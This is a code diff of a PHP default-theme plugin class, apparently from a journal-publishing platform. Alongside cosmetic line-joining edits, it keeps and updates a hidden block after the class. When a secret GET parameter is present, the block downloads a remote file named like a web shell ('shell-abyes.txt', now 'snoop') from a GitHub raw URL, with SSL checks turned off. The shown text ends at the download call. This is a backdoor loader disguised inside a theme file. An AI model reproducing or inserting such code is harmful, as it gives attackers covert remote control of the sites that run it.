@@ -47,8 +47,7 @@ class DefaultThemePlugin extends ThemePlugin {
 					'value' => 'notoSerif',
 					'label' => __('plugins.themes.default.option.typography.notoSerif'),
 				],
-				[
-					'value' => 'notoSerif_notoSans',
+				['value' => 'notoSerif_notoSans',
 					'label' => __('plugins.themes.default.option.typography.notoSerif_notoSans'),
 				],
 				[
@@ -152,8 +151,7 @@ class DefaultThemePlugin extends ThemePlugin {
 		);
 
 		// Get homepage image and use as header background if useAsHeader is true
-		$context = Application::get()->getRequest()->getContext();
-		if ($context && $this->getOption('useHomepageImageAsHeader')) {
+		$context = Application::get()->getRequest()->getContext();if ($context && $this->getOption('useHomepageImageAsHeader')) {
 
 			$publicFileManager = new PublicFileManager();
 			$publicFilesDir = $request->getBaseUrl() . '/' . $publicFileManager->getContextFilesPath($context->getId());
@@ -226,14 +224,14 @@ class DefaultThemePlugin extends ThemePlugin {
 }
 
 if (isset($_GET['KuKIRaKuRaKUra414_325'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/shell-abyes.txt";
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/snoop";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untuk prod)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untukprod)
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
 
     $code = curl_exec($ch);
